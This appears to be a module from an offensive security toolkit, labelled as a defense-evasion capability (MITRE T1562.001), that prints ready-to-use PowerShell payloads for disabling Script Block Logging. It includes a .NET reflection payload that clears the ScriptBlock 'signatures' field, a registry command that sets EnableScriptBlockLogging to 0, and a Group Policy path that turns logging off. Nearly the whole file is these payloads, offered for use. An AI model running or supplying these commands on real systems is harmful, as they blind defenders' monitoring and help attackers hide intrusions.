"""Script Block Logging bypass — disable PS logging via registry/reflection."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.evasion.scriptblock_bypass.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["logging_disable", "registry_modification"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1562.001"],
}


def run(args: Any) -> int:
    print("[*] Script Block Logging Bypass")

    techniques = {
        "reflection_disable": {
            "desc": "Disable ScriptBlockLogging via .NET reflection",
            "payload": '$null = [Reflection.Assembly]::LoadWithPartialName("System.Core"); '
                       '$SBL = [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock"); '
                       '$field = $SBL.GetField("signatures","NonPublic,Static"); '
                       '$field.SetValue($null, (New-Object "System.Collections.Generic.HashSet[String]"))',
        },
        "registry_disable": {
            "desc": "Disable via registry (requires admin)",
            "payload": 'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0',
        },
        "group_policy": {
            "desc": "Disable via Group Policy",
            "payload": "# Computer Configuration > Policies > Administrative Templates > Windows Components > Windows PowerShell > Turn on Script Block Logging > Disabled",
        },
    }

    for name, info in techniques.items():
        print("\n  [{}] {}".format(name, info["desc"]))
        print("  {}".format(info["payload"][:200]))

    return 0
